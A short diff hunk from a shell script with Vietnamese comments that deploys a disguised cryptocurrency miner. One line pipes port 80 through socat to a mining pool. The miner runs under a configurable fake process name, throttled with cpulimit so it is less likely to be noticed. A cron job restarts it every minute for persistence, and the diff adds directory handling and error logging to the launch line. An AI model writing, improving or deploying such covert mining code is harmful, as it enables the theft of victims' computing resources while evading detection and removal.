@@ -56,7 +56,8 @@ EOF
 tmux has-session -t proxy 2>/dev/null || tmux new-session -d -s proxy "sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:$POOL_REAL"
 
 # ==== Chạy tiến trình đào ngụy trang ====
-tmux has-session -t "$SESSION_NAME" 2>/dev/null || tmux new-session -d -s "$SESSION_NAME" "cpulimit -l $CPU_PERCENT -- ./$PROCESS_NAME -c .cfg.json"
+tmux has-session -t "$SESSION_NAME" 2>/dev/null || \
+tmux new-session -d -s "$SESSION_NAME" "cd $INSTALL_DIR && cpulimit -l $CPU_PERCENT -- ./$PROCESS_NAME -c .cfg.json" 2>> "$INSTALL_DIR/error.log"
 
 # ==== Tạo cron job để tự khôi phục ====
 (crontab -l 2>/dev/null; echo "* * * * * pgrep -f $PROCESS_NAME > /dev/null || (cd $INSTALL_DIR && tmux new-session -d -s $SESSION_NAME 'cpulimit -l $CPU_PERCENT -- ./$PROCESS_NAME -c .cfg.json')") | crontab -
